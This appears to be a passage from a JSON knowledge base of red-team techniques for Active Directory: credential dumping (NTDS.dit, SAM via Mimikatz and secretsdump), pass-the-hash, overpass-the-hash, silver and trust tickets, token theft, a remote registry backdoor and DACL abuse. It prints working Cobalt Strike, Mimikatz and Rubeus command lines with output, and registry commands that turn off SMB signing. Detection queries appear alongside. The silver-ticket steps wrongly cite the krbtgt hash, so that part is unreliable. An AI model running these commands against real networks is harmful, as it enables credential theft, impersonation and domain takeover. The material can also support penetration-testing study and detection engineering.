                    "sudo": true,
                    "Ettercap": true
                },
                "results": [
                    "MITM:ATTACK:CONFIGURED"
                ]
            },
            {
                "id": "bbf02354-a642-4775-a2ca-2f64fa5c42a3",
                "name": "Start SSLStrip",
                "description": "Execute SSLStrip to intercept and log traffic while stripping SSL from the communication, effectively downgrading HTTPS requests to HTTP.",
                "requirements": {
                    "sslstrip": true
                },
                "results": [
                    "NET:SSL:STRIPPED"
                ]
            },
            {
                "id": "5308f22d-f58c-44b5-bbc4-af161d1a2950",
                "name": "Log SSLStrip Output",
                "description": "Capture the logs generated by SSLStrip to analyze and retrieve any captured credentials or sensitive data.",
                "requirements": {},
                "results": [
                    "CRED:CAPTURED"
                ]
            }
        ]
    },
    {
        "id": "8322df56-6eed-4862-b871-675bcbcdc8b5",
        "name": "NTDS",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1003.003",
        "external": false,
        "description": "NoDescription",
        "content": "",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "b54eec91-3e84-4d6f-95b6-a73f00200718",
                "name": "Export NTDS.dit File",
                "description": "Export the NTDS.dit file from the Active Directory database located at C:\\Windows\\NTDS\\NTDS.dit. This file contains sensitive information about users, including hashed passwords.",
                "requirements": {
                    "access": "Domain Admin privileges",
                    "environment": "Windows Server with Active Directory"
                },
                "results": [
                    "FILE:NTDS.dit"
                ]
            },
            {
                "id": "fbbd549f-5bee-4740-af28-cde1b109cbdb",
                "name": "Locate the Active Directory Database Backup",
                "description": "Check the backup location for Active Directory or the NTDS.dit file backups, commonly found in C:\\Windows\\NTDS\\ or in designated backup folders. This can provide older states of user credentials.",
                "requirements": {
                    "access": "Domain Admin privileges",
                    "environment": "Windows Server with Active Directory"
                },
                "results": [
                    "FILE:AD_BACKUP"
                ]
            },
            {
                "id": "7007fd1a-bf22-423b-98eb-e26e960ae02f",
                "name": "Analyze NTDS.dit with NTDSExtract",
                "description": "Use the NTDSExtract tool to analyze the NTDS.dit file and extract user credentials. Run the command `ntdsutil.exe \"activate instance ntds\" \"ifm\" \"create full C:\\Backup\"` to create a backup, then run NTDSExtract on the backup.",
                "requirements": {
                    "access": "Domain Admin privileges",
                    "environment": "Windows Server with NTDSExtract tool available"
                },
                "results": [
                    "CRED:PASS",
                    "CRED:USERNAME"
                ]
            },
            {
                "id": "dacaf63f-e11e-4898-9b44-e48b8bfcf163",
                "name": "Retrieve User Account Control Info",
                "description": "Query the user attributes from the NTDS.dit file for User Account Control (UAC) flags to identify privilege escalation opportunities. This could involve using LDAP queries against the AD.",
                "requirements": {
                    "access": "Domain Admin privileges",
                    "environment": "Windows Server with DSQuery or LDAP tools"
                },
                "results": [
                    "UAC:FLAG"
                ]
            },
            {
                "id": "c3af2512-904f-4821-8cda-e3e126a880aa",
                "name": "Check for Unused or Disabled Accounts",
                "description": "Review user accounts in the NTDS.dit for those that are inactive or disabled, which may be targets for impersonation. Use PowerShell or LDAP queries such as `Get-ADUser -Filter {Enabled -eq $false}`.",
                "requirements": {
                    "access": "Domain Admin privileges or sufficient AD access",
                    "environment": "Windows Server with Active Directory module for PowerShell"
                },
                "results": [
                    "ACCOUNT:DISABLED"
                ]
            }
        ]
    },
    {
        "id": "7f22df56-6eed-4862-b871-675bcbcdc8b5",
        "name": "Trust Ticket",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1003.003",
        "external": false,
        "description": "NoDescription",
        "content": "1. Get inter-realm key which is responsible for cross forest TGT signing\n2. Forge a Trust Ticket for another domain\n3. Get TGS\n> .\\asktgs path_trust_ticket cifs/dc_of_ext_domain\n\n\u00e2\u201e\u00b9 It should be noted that the targeted domain must have explicit permissions set for groups or users in the trusted domain, something which is not uncommon.\n",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "ce769586-e989-4af1-bd6a-c90bc98d4e45",
                "name": "Extract Inter-Realm Key",
                "description": "Extract the inter-realm key required for signing cross-forest TGTs. This typically involves accessing the Active Directory where the key is stored.",
                "requirements": {},
                "results": [
                    "KEY:INTER_REALM_EXTRACTED"
                ]
            },
            {
                "id": "53f30a76-7679-4b23-a11e-f1c2d2f5622a",
                "name": "Forge Trust Ticket",
                "description": "Using the extracted inter-realm key, create a forged trust ticket for a user in another domain. This involves configuring the ticket appropriately to simulate legitimate access.",
                "requirements": {},
                "results": [
                    "TICKET:FORGED"
                ]
            },
            {
                "id": "f130e40d-3bfc-4595-b069-0ed045d0f49a",
                "name": "Request TGS with Forged Ticket",
                "description": "Use the forged trust ticket to request a Ticket Granting Service (TGS) ticket for a service in the external domain using the appropriate command-line utility.",
                "requirements": {},
                "results": [
                    "TGS:RECEIVED",
                    "CRED:USER"
                ]
            }
        ]
    },
    {
        "id": "edd08324-6139-4706-bbe7-aa2857a10cd2",
        "name": "Overpass-the-Hash",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1550.002",
        "external": false,
        "description": "NoDescription",
        "content": "# Overpass-the-Hash\nAuthentication via Kerberos (AES key) rather than NTLM.\n\n### Manually\n[[Use Kerberos ticket (kirbi)]]\n\n### Inject TGT automatically\n- Use [[Rubeus#Request TGT and inject into sacrificial process]]\n\n\n## Detection\nWhen a TGT is requested, event `4768: A Kerberos authentication ticket (TGT) was requested` is generated.\n* NTLM is often KeyType **RC4-HMAC** (0x17) and nowadays not often used.\n* Nowadays used is  **AES256** (0x12).\n\nThis means we can find 4768's where the encryption type is RC4, which can be significant outliers.\n>event.code: 4768 and winlog.event_data.TicketEncryptionType: 0x17\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": true,
        "changes": [
            "\n## [[Rubeus]]\nRubeus allows us to perform opth without needing elevated privileges. The process to follow is:\n\n-   Request a TGT for the user we want to impersonate.\n-   Create a sacrificial logon session.\n-   Pass the TGT into that logon session.\n-   Access the target resource.\n\n#OPSEC Rubeus also has an `/opsec` argument which tells it to send the request without pre-auth, to more closely emulate genuine Kerberos traffic.\n\n### SHA256\n1. Request a hash via [[eKeys]] or [[LSASS dumping]] (not recommended anymore)\n2. Ask for a TGT\n```````beacon\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe asktgt /user:doe /domain:edu.evil.corp /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1 /nowrap /opsec\n\n[*] Action: Ask TGT\n\n[*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)\n[*] Using aes256_cts_hmac_sha1 hash: a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1\n[*] Building AS-REQ (w/ preauth) for: 'edu.evil.corp\\doe'\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n [...ticket...]\n\n  ServiceName           :  krbtgt/edu.evil.corp\n  ServiceRealm          :  edu.evil.corp\n  UserName              :  doe\n  UserRealm             :  edu.evil.corp\n  StartTime             :  7/9/2022 2:58:21 PM\n  EndTime               :  7/10/2022 12:58:21 AM\n  RenewTill             :  7/16/2022 2:58:21 PM\n  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable\n  KeyType               :  aes256_cts_hmac_sha1\n  Base64(key)           :  x4F1hxBrfwvgleEHnYbg9KV5fch2VOS5m36IO/srA0g=\n```````\n\n### RC4\n``````beacon\nMost public articles demonstrate using the NTLM hash to request the TGT.\n\nbeacon> execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Debug\\Rubeus.exe asktgt /user:doe /domain:edu.evil.corp /rc4:4ffd3eabdce2e158d923ddec72de979e /nowrap\n\n[*] Action: Ask TGT\n\n[*] Using rc4_hmac hash: 4ffd3eabdce2e158d923ddec72de979e\n[*] Building AS-REQ (w/ preauth) for: 'edu.evil.corp\\doe'\n[+] TGT request successful!\n[*] base64(ticket.kirbi):\n\n [...ticket...]\n\n  ServiceName           :  krbtgt/edu.evil.corp\n  ServiceRealm          :  edu.evil.corp\n  UserName              :  doe\n  UserRealm             :  edu.evil.corp\n  StartTime             :  7/9/2022 2:46:58 PM\n  EndTime               :  7/10/2022 12:46:58 AM\n  RenewTill             :  7/16/2022 2:46:58 PM\n  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable\n  KeyType               :  rc4_hmac\n  Base64(key)           :  Z1/VMlSwxK4jrbL8qmjvNw==\n``````"
        ],
        "tools": [
            "Rubeus"
        ],
        "steps": [
            {
                "id": "4b60065f-8b16-4f05-83ad-75a44e239c6e",
                "name": "Request TGT with AES256",
                "description": "Use Rubeus to request a Kerberos Ticket Granting Ticket (TGT) using an AES256 hash for a specific user. This action will demonstrate the TGT issuance process when using a secure hash type.",
                "requirements": {
                    "administrator access": true,
                    "Rubeus": true,
                    "target user credentials": true
                },
                "results": [
                    "TGT:SUCCESS",
                    "CRED:USERNAME:doe",
                    "CRED:DOMAIN:edu.evil.corp"
                ]
            },
            {
                "id": "bd1d30d8-ec6a-43c2-afe8-48c4ef70c7be",
                "name": "Request TGT with RC4",
                "description": "Use Rubeus to request a Kerberos Ticket Granting Ticket (TGT) using an RC4 hash for a specific user. This showcases the usage of a less secure hash type to understand potential weaknesses.",
                "requirements": {
                    "administrator access": true,
                    "Rubeus": true,
                    "target user credentials": true
                },
                "results": [
                    "TGT:SUCCESS",
                    "CRED:USERNAME:doe",
                    "CRED:DOMAIN:edu.evil.corp"
                ]
            },
            {
                "id": "c4a90b82-6fbd-46e2-8495-3a8372e9cfd9",
                "name": "Detecting Kerberos Ticket Requests",
                "description": "Monitor Windows Event Logs to detect Kerberos Ticket Granting Ticket requests. Specifically look for event ID 4768 that indicates a TGT was requested and analyze the TicketEncryptionType data to identify RC4 encryptions.",
                "requirements": {
                    "admin access to event logs": true
                },
                "results": [
                    "EVENT:4768",
                    "ENCRYPTION_TYPE:RC4"
                ]
            }
        ]
    },
    {
        "id": "4eaec5b9-9ee3-4108-8b71-61ec050fe6c8",
        "name": "Pass-the-Hash",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1550.002",
        "external": false,
        "description": "NoDescription",
        "content": "# Pass-the-Hash\nIt allows you to authenticate to a Windows service using the NTLM hash of a user. It works by starting a new logon session with a wrong details and replacing all session information like the domain, username and NTLM hash.  \nThe tool of choice would be [[Mimikatz]].\n\n\u26a0\ufe0f Warning\n* This requires patching LSASS which can be easily detected or prevented by PPL and requires local admin privs.  \n* Not providing `/run` will spawn the process with UI (expected running as SYSTEM).\n\n#OPSEC No LSASS memory patch and no admin rights are required with [[Overpass-the-Hash]]\n\n## Detection\n* Sysmon will record the process creation event for `cmd.exe` including the command line arguments `echo 1cbe909fe8a > \\\\.\\pipe\\16ca6d.`  \nIn Kibana:\n>event.module: sysmon and event.type: process_start and process.name: cmd.exe and process.command_line: *\\\\\\\\.\\\\pipe\\\\*\n* Event `4624` with logon type 9 will be recorded. This event records the executing user's Logon ID, which we can cross reference from the process creation event above.\n>event.code: 4624 and winlog.logon.id: 0xe6d64\n\n## Troubleshoot\n1. There is a problem if the account is not RID-500 (Admin) and only in the admin group\n\n2. The two registry entries needed are:\n    ```powershell\n    Set-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord\n    Set-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters -Name RequireSecuritySignature -Value 0 -Type DWord\n    ```\n    OR\n    ```powershell\n    reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\n    reg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" /v RequireSecuritySignature /t REG_DWORD /d 0 /f\n    ```\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Mimikatz]]\n#OPSEC this to specify the programm and avoid the weird piping into cmd.exe\n## Recommended\n``````beacon\nbeacon> mimikatz sekurlsa::pth /user:doe /domain:edu.evil.corp /ntlm:4ffd3eabdce2e158d923ddec72de979e\n\nuser    : doe\ndomain    : edu.evil.corp\nprogram    : cmd.exe\nimpers.    : no\nNTLM    : 4ffd3eabdce2e158d923ddec72de979e\n  |  PID  6284\n  |  TID  6288\n  \nbeacon> steal_token 6284\n[+] Impersonated NT AUTHORITY\\SYSTEM\n``````"
        ],
        "tools": [
            "Mimikatz"
        ],
        "steps": [
            {
                "id": "e57c8d82-f3c2-42b2-8c4f-8ec4c3443b16",
                "name": "Enable LocalAccountTokenFilterPolicy",
                "description": "Set the LocalAccountTokenFilterPolicy registry value to allow local accounts remote access without elevation. This is essential for passing the hash to work correctly.",
                "requirements": {},
                "results": [
                    "REGISTRY: LocalAccountTokenFilterPolicy=1"
                ]
            },
            {
                "id": "d4fca492-8b64-4055-a19f-243e962b4890",
                "name": "Set RequireSecuritySignature",
                "description": "Modify the RequireSecuritySignature registry value to disable security signatures for LanManServer, allowing for easier execution of pass-the-hash attacks.",
                "requirements": {},
                "results": [
                    "REGISTRY: RequireSecuritySignature=0"
                ]
            },
            {
                "id": "f00b58d6-9e3e-469a-bd81-73e284ffd723",
                "name": "Execute Mimikatz Pass-the-Hash",
                "description": "Use Mimikatz to perform the Pass-the-Hash attack to impersonate a user using their NTLM hash. This will establish a session with the provided credentials.",
                "requirements": {
                    "tool": "Mimikatz"
                },
                "results": [
                    "CRED:USERNAME=doe",
                    "CRED:DOMAIN=edu.evil.corp",
                    "CRED:NTLM",
                    "SESSION:IMPERSONATED"
                ]
            },
            {
                "id": "7b42c720-4898-4a23-b50e-94b2cced93f0",
                "name": "Monitor Sysmon for Event 4693",
                "description": "Track Sysmon logs to collect process creation events (Event ID 4693) that indicate a command line invocation often related to Pass-the-Hash attempts, specifically looking for cmd.exe process creation with pipe commands.",
                "requirements": {},
                "results": [
                    "EVENT:4624",
                    "EVENT:4693"
                ]
            }
        ]
    },
    {
        "id": "a0aae509-b9d7-4313-a3d2-8d715a3ee1cc",
        "name": "Remote Registry",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1112",
        "external": false,
        "description": "NoDescription",
        "content": "# Remote Registry\nThe [DAMP](https://github.com/HarmJ0y/DAMP) project modifies host-based DACL to enable a \"backdoor\" which remotely retrieves secrets from a machine, including SAM and domain cached hashes enabling the creation of [[Silver Ticket]]s.\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Add-RemoteRegBackdoor"
        ],
        "steps": [
            {
                "id": "f0a8c6d4-3e98-412e-860c-6c45cda6bb94",
                "name": "Run Add-RemoteRegBackdoor",
                "description": "Execute the Add-RemoteRegBackdoor command on a compromised machine to modify host-based DACL and establish a backdoor for remote registry access.",
                "requirements": {
                    "access": "Administrator privileges on the compromised machine"
                },
                "results": [
                    "REGISTRY:BACKDOOR_ADDED"
                ]
            },
            {
                "id": "cb2b66f5-081e-469f-aef2-d8a361a1714e",
                "name": "Retrieve Machine Account Hash",
                "description": "Use the Get-RemoteMachineAccountHash command to retrieve the machine account hash from a target machine after establishing the backdoor.",
                "requirements": {
                    "access": "Valid credentials with access to the target machine"
                },
                "results": [
                    "HASH:MACHINE_ACCOUNT_HASH"
                ]
            },
            {
                "id": "da521fe5-61a7-4c71-8854-e2702bc592e4",
                "name": "List Remote C$ Share",
                "description": "Attempt to access the C$ share on the remote machine using the established backdoor to check for file access permissions.",
                "requirements": {
                    "access": "Credentials with restricted permissions"
                },
                "results": [
                    "C$ACCESS:FAIL",
                    "C$ACCESS:N/A"
                ]
            }
        ]
    },
    {
        "id": "4dc1dc4d-e4d0-4458-b51e-874d080c0ac4",
        "name": "Security Account Manager",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1003.002",
        "external": false,
        "description": "NoDescription",
        "content": "# Security Account Manager\nThe Security Account Manager (SAM) database holds the NTLM hashes of local accounts. These can be extracted with `lsadump::sam`.  \nImportant to check for credentials reuse.\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Mimikatz]]\n``````\nbeacon> mimikatz lsadump::sam\n\nDomain : SRV1\nSysKey : 5d11b46a92921b8775ca574306ba5355\nLocal SID : S-1-5-21-4124990477-354564332-720757739\n\nSAMKey : fb5c3670b47e5ecae21f328b12d3103b\n\nRID  : 000001f4 (500)\nUser : Administrator\n  Hash NTLM: 12a427a6fdf69be4917d30afc633f6fd\n\nRID  : 000001f5 (501)\nUser : Guest\n\nRID  : 000001f7 (503)\nUser : DefaultAccount\n``````",
            "\n## [[Secretsdump]]\nReceiving machine passwords via impacket (Admin):\n    ```powershell\n    # Change permissions of hklm\\security to full access\n    reg save hklm\\sam c:\\temp\\sam.save\n    reg save hklm\\security c:\\temp\\security.save\n    reg save hklm\\system c:\\temp\\system.save\n    secretsdump.py -sam C:\\Users\\ext_ecorp_admin\\Desktop\\sam.save -security C:\\Users\\ext_ecorp_admin\\Desktop\\security.save -system C:\\Users\\ext_ecorp_admin\\Desktop\\system.save LOCAL\n    ```\n\n## References"
        ],
        "tools": [
            "Mimikatz",
            "Secretsdump"
        ],
        "steps": [
            {
                "id": "a4a48f08-b540-4c2e-8bb5-827cf67772c5",
                "name": "Extract NTLM hashes using Mimikatz",
                "description": "Use Mimikatz to extract NTLM hashes from the Security Account Manager (SAM). The command 'lsadump::sam' retrieves user account information including NTLM hashes.",
                "requirements": {},
                "results": [
                    "CRED:PASS",
                    "CRED:USERNAME"
                ]
            },
            {
                "id": "d4535820-8682-4e7c-bb8b-d65f431d0a8f",
                "name": "Export SAM, Security, and SYSTEM registry hives",
                "description": "Use Windows Registry commands to export the SAM, Security, and SYSTEM hives to files. These files are necessary for offline analysis and to extract NTLM hashes using other tools.",
                "requirements": {},
                "results": [
                    "FILE:SAM",
                    "FILE:SECURITY",
                    "FILE:SYSTEM"
                ]
            },
            {
                "id": "e173cda4-ba32-4e2b-b13e-61c6b15cf854",
                "name": "Dump credentials using Secretsdump",
                "description": "Run the Secretsdump.py script with the exported SAM, Security, and SYSTEM files to extract NTLM hashes and accounts. This is often executed in a Python environment after permissions are set appropriately.",
                "requirements": {},
                "results": [
                    "CRED:PASS",
                    "CRED:USERNAME"
                ]
            }
        ]
    },
    {
        "id": "c423b306-a2e0-4e2a-ad08-ac83bd8f0c78",
        "name": "Silver Ticket",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1558.002",
        "external": false,
        "description": "Extract kerberos ticket from memory",
        "content": "# Silver Ticket\nA Silver Ticket is a forged TGS, signed using the secret material (RC4/AES keys) of a machine account. You may forge a TGS for any user to any service on a specific machine. This access will remain until the computer account password changes, which is every 30 days by default.\n\n#OPSEC Silver and [[Golden Ticket]] can be generated \"offline\" and imported into your session. This saves executing Mimikatz on the target. Generating both silver and golden tickets can be done with [[Mimikatz#Create silver ticket]].\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Mimikatz]]\n### Create silver ticket\n1. [[DCSync]] the krbtgt user\n2. Generate [[Silver Ticket]]\nWhere:\n-   `/user` is the username to impersonate.\n-   `/domain` is the current domain name.\n-   `/sid` is the current domain SID.\n-   `/target` is the target machine.\n-   `/aes256` is the AES256 key for the target machine.\n-   `/ticket` is the filename to save the ticket as.\n```beacon\nmimikatz # kerberos::golden /user:Administrator /domain:edu.evil.corp /sid:S-1-5-21-3263068140-2042698922-2891547269 /target:srv2 /service:cifs /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /ticket:srv2-cifs.kirbi\nUser      : Administrator\nDomain    : edu.evil.corp (EDU)\nSID       : S-1-5-21-3263068140-2042698922-2891547269\nUser Id   : 500\nGroups Id : *513 512 520 518 519\nServiceKey: babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 - aes256_hmac\nService   : cifs\nTarget    : srv2\nLifetime  : 25/05/2022 10:30:08 ; 23/05/2031 10:30:08 ; 23/05/2031 10:30:08\n-> Ticket : srv2-cifs.kirbi\n\n * PAC generated\n * PAC signed\n * EncTicketPart generated\n * EncTicketPart encrypted\n * KrbCred generated\n\nFinal Ticket Saved to file !\n```\n3. [[Use Kerberos ticket (kirbi)]]\n\nHere are some useful ticket combinations:\n| Technique         | Required Service Tickets |\n| ----------------- | ------------------------ |\n| psexec            | CIFS                     |\n| winrm             | HOST & HTTP              |\n| dcsync (DCs only) | LDAP                     |"
        ],
        "tools": [
            "Mimikatz"
        ],
        "steps": [
            {
                "id": "923d64b8-e3c1-489d-b814-659375c7e655",
                "name": "DCSync krbtgt user",
                "description": "Perform DCSync on the krbtgt account to obtain the NTLM hash. This allows for the creation of Kerberos tickets later.",
                "requirements": {},
                "results": [
                    "KRB:NTLM_HASH"
                ]
            },
            {
                "id": "276471b3-a47b-433f-b94e-175f928d5ef4",
                "name": "Generate Silver Ticket",
                "description": "Use Mimikatz to generate a Silver Ticket for a specific user, targeting a specific service on a machine using the krbtgt NTLM hash obtained from the previous step.",
                "requirements": {
                    "krbtgt_ntlm_hash": "Must have obtained the NTLM hash from the DCSync step"
                },
                "results": [
                    "TICKET:CREATE",
                    "CRED:USERNAME=Administrator",
                    "CRED:DISTINGUISHED_NAME=edu.evil.corp"
                ]
            },
            {
                "id": "e074c87c-c5cc-4c2b-89fe-5f013dcbf084",
                "name": "Use Kerberos Ticket",
                "description": "Utilize the generated Silver Ticket to impersonate the user and access the specified service on the target machine.",
                "requirements": {
                    "silver_ticket": "The .kirbi file generated in the previous step"
                },
                "results": [
                    "ACCESS:GRANTED",
                    "SERVICE:CIFS"
                ]
            }
        ]
    },
    {
        "id": "a5a297db-6273-4302-ba9d-dac57e30224e",
        "name": "SpawnAs",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1000",
        "external": false,
        "description": "NoDescription",
        "content": "# SpawnAs\nThis will spawn a new beacon process using the plain-text credentials of another user. This includes a new logon session from interactive logon type which allows you to use the privs on the machine itself.\nIt does not required local admin privileges.\n\n```cmd\nbeacon> spawnas EDU\\doe P4ssw0rd1. tcp-4444-local\n[+] established link to child beacon: 10.10.17.231\n```\n#OPSEC It creates a user profile on disk.\n\n\u26a0\ufe0f WARNING  \nDo not run this from a directory where the target user does not have read access, or from a SYSTEM beacon\n> \n> beacon> spawnas EDU\\doe Passw0rd1 tcp-4444-local\n> [-] could not run C:\\Windows\\system32\\rundll32.exe as EDU\\doe: 267\n> [-] Could not connect to target\n> \n> `cd` to a another directory like `C:\\` and try again.\n\n## Detection\n* Event `4624: An account was successfully logged on` but with a logon type of `2` (LOGON32_LOGON_INTERACTIVE). \n    * Executing user = TargetUserName\n    * Impersonated user = TargetOutboundUserName.\n* Sysmon event 1 (Process Create) because Cobalt Strike spawns rundll32 by default.\n>event.type: process_start and process.name: rundll32.exe\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "4f50ab35-09d4-48a1-bb83-0dd0186da458",
                "name": "Spawn as Target User",
                "description": "Use the spawnas command to create a new process with the credentials of the target user, initiating a new interactive session.",
                "requirements": {
                    "access": "Access to the Cobalt Strike beacon",
                    "user_credentials": "Valid target user credentials"
                },
                "results": [
                    "CRED:PASS",
                    "CRED:USERNAME",
                    "SESSION:INTERACTIVE"
                ]
            },
            {
                "id": "bc01fa13-ee4e-4b50-b5c0-41bba2b376e6",
                "name": "Verify Logon Event",
                "description": "Check the Security Event Log for Event ID 4624 which indicates a successful logon by the target user. Look for LOGON32_LOGON_INTERACTIVE.",
                "requirements": {
                    "access": "Administrator access to read security logs"
                },
                "results": [
                    "EVENT:4624",
                    "LOGON_TYPE:2",
                    "EXECUTING_USER:TargetUserName",
                    "IMPERSONATED_USER:TargetOutboundUserName"
                ]
            },
            {
                "id": "b1ba040a-849e-4275-9ce7-f18cecd20c82",
                "name": "Monitor Process Creation",
                "description": "Set up monitoring for Sysmon Event ID 1 which detects new process creation, particularly for rundll32.exe as spawned by Cobalt Strike.",
                "requirements": {
                    "access": "Sysmon configured and logging enabled"
                },
                "results": [
                    "EVENT:PROCESS_CREATE",
                    "PROCESS_NAME:rundll32.exe"
                ]
            },
            {
                "id": "5127e763-c82e-4ddd-8666-8d47fc1ab9d1",
                "name": "Check for User Profile Creation",
                "description": "Examine the file system to identify if a new user profile has been created on disk, indicating that the spawnas command was successful.",
                "requirements": {
                    "access": "File system access with permissions to view user profiles"
                },
                "results": [
                    "PROFILE:CREATED",
                    "DIRECTORY:C:\\Users\\TargetUser"
                ]
            }
        ]
    },
    {
        "id": "094c790c-dd71-44f8-aeae-ac97d138abef",
        "name": "Steal Token",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1558",
        "external": false,
        "description": "NoDescription",
        "content": "# Steal Token\nThe `steal_token` command will impersonate the access token of the target process. Like `make_token`, only for network, not local actions.\n\nThis command opens a handle to another users target process in order to duplicate and impersonate the access token, and therefore requires local admin privileges.\n``````beacon\nbeacon> ls \\\\srv2\\c$\\n[-] could not open \\\\srv2\\c$\\*: 5\\n\\nbeacon> steal_token 3320\\n[+] Impersonated EDU\\doe\\n\\nbeacon> ls \\\\srv2\\c$\\n\\n Size     Type    Last Modified         Name\n ----     ----    -------------         ----\\n dir     05/10/2022 04:11:30   $Recycle.Bin\\n dir     05/10/2022 03:23:44   Boot\\n``````\\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "7e1883e2-9fc6-4f5f-89e5-baf20dea02f1",
                "name": "Check process permissions",
                "description": "Verify that the current user has permissions to impersonate target processes, ensuring they have local administrator rights.",
                "requirements": {},
                "results": [
                    "PERM:ADMIN"
                ]
            },
            {
                "id": "ad7bba69-4e16-4c05-9d04-51790956eae5",
                "name": "Identify target process ID",
                "description": "List running processes and identify the target process ID (PID) for the theft operation, which will be required to perform the steal_token command.",
                "requirements": {},
                "results": [
                    "PID:FOUND"
                ]
            },
            {
                "id": "cc3d5b6c-53a6-4273-9fb4-910e12cc3b19",
                "name": "Execute steal_token command",
                "description": "Use the steal_token command to impersonate the access token of the identified target process, which allows the current session to perform actions as the target user.",
                "requirements": {},
                "results": [
                    "TOKEN:IMPERSONATED"
                ]
            },
            {
                "id": "d6e92489-bc34-4273-9e96-63eadf272a36",
                "name": "Access resources as target user",
                "description": "Attempt to access a resource (e.g., file share) that the targeted user has permissions to, confirming the successful impersonation.",
                "requirements": {},
                "results": [
                    "ACCESS:GRANTED"
                ]
            }
        ]
    },
    {
        "id": "6bdbf381-10b4-4aec-944c-694b633b7711",
        "name": "Validate Credentials",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1078",
        "external": false,
        "description": "Validate Credentials",
        "content": "# Validate Credentials\nIn order to not trigger any logon events it is recommended to try validating especially service accounts against the DC directly.\n\n## LDAP\nADExplorer can be used to login and verify\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "ldapsearch"
        ],
        "steps": [
            {
                "id": "4914b15e-00b7-4c64-8702-4b582a1d3aba",
                "name": "Get Domain Controller",
                "description": "Identify the hostname or IP address of the Domain Controller for your Active Directory environment.",
                "requirements": {},
                "results": [
                    "DC:IDENTIFIED"
                ]
            },
            {
                "id": "c8b2af49-775f-4b03-ba73-69f83c3be21e",
                "name": "Login with ldapsearch",
                "description": "Use the ldapsearch tool to login to the Domain Controller with a service account to validate the credentials. Adjust the command according to your environment details.",
                "requirements": {
                    "tool": "ldapsearch"
                },
                "results": [
                    "CRED:PASS",
                    "CRED:USERNAME",
                    "AUTH:SUCCESS"
                ]
            },
            {
                "id": "6a846dba-a976-41e5-80f7-5bbde8d0360e",
                "name": "Check Anonymous Login Capability",
                "description": "Attempt an anonymous bind to the Domain Controller to see if anonymous LDAP connections are permitted. This may expose useful information if successful.",
                "requirements": {
                    "tool": "ldapsearch"
                },
                "results": [
                    "AUTH:ANONYMOUS_SUCCESS"
                ]
            },
            {
                "id": "5c2ffa05-b83a-4752-8e84-b7a1ab1de632",
                "name": "Verify User Account",
                "description": "Query the Active Directory using the credentials you validated to confirm the user account and retrieve user attributes.",
                "requirements": {
                    "tool": "ldapsearch"
                },
                "results": [
                    "USER:FOUND",
                    "ATTRIBUTES:RETRIEVED"
                ]
            }
        ]
    },
    {
        "id": "0f8f858c-9417-4ae9-a47a-5139b129d2ee",
        "name": "Discretionary Access Control Lists (DACL)",
        "phase": "09. AD Misconfigurations",
        "ttp": "T1000",
        "external": false,
        "description": "Examining and manipulating DACL permissions on accounts to evaluate security risks.",
        "content": "# Discretionary Access Control Lists (DACL)\nA principal has ACLs on more privileged accounts (like via IT-Support OU), that enable them to takeover the account.\n\nInteresting permissions:\n* GenericAll\n* WriteProperty\n* WriteDacl\n\n## WriteDacl\nGrant [[Discretionary Access Control Lists (DACL)#GenericAll]] to any principal.\n\n## WriteOwner\nChange the ownership of the object to any principal which would then inherit GenericAll over it.\n\n## GenericAll\n### Password Reset\n\u26d4 Use NEVER (only with explicit permission of the customer)  \n#OPSEC very bad\n``````beacon\nbeacon> getuid\n[*] You are EDU\\john\n\nbeacon> make_token EDU\\doe Passw0rd1\n[+] Impersonated EDU\\john\n\nbeacon> run net user jonas Password123. /domain\n\nThe request will be processed at a domain controller for domain edu.evil.corp.\n\nThe command completed successfully.\n``````\n\n### Add SPN for [[Kerberoasting]]\n1. Set an SPN via [[PowerView#Change DomainObject (SPN)]]\n2. Can be performed via [[Rubeus#Targeted Kerberoasting]]\n\n### Add SPN for [[AS-REP Roasting]]\nModify the User Account Control value on the account to disable preauthentication and then ASREProast it.\n1. [[PowerView#Add DONT_REQ_PREAUTH 